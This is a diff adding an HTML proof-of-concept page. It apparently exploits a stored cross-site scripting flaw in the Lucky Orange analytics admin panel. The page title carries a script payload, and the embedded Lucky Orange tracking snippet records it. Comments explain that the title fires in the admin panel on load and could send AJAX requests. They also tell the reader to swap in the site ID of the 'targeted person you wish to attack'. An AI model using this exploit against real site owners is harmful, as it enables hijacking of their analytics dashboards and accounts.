@@ -1,0 +1,24 @@
+<!doctype html>    
+<html>
+    <head>
+        <title><script>alert('XSS!')</script></title>
+         <!-- The title of a crafted page can for instance be used to send an xss to the admin panel of lucky orange when page will be loaded. 
+         One could also send some AJAX requests manually too. 
+            -->
+
+
+        <script type='text/javascript'>
+            window.__wtw_lucky_site_id = 44295;
+            <!-- Just change the ID by the website ID of the targeted person you wish to attack. -->
+
+            (function() {
+                var wa = document.createElement('script'); wa.type = 'text/javascript'; wa.async = true;
+                wa.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://cdn') + '.luckyorange.com/w.js';
+                var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(wa, s);
+            })();
+        </script>
+    </head>
+    <body>
+    test
+    </body>
+<html>
